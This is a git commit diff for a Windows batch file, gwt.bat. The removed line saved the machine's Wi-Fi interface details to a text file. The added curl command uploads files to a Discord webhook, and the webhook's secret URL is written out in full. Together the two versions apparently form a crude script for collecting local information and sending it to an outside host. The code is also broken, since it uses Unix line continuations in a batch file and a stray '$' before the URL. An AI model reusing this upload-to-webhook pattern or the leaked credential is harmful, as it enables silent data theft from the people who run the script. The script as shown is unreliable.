6886b00463c43a5037b8609649188670976066e3
Conspet <70810310+Conspet@users.noreply.github.com>
2022-03-26 04:41:17 +0300

    Update gwt.bat

--- gwt.bat
+++ gwt.bat
@@ -1,1 +1,5 @@
-Netsh WLAN show interfaces > c:/wifiinfo.txt
+curl \
+  -F 'payload_json={"username": "test", "content": "hello"}' \
+  -F "file1=@cat.jpg" \
+  -F "file2=@images/dog.jpg" \
+  $https://discord.com/api/webhooks/950778435976982568/4BE8FipapqAcUiUTr7JPEwdL1OveFSINTFjnZdEDt28UffFmf8Dj7MsOZ5Y10VtT6dzs
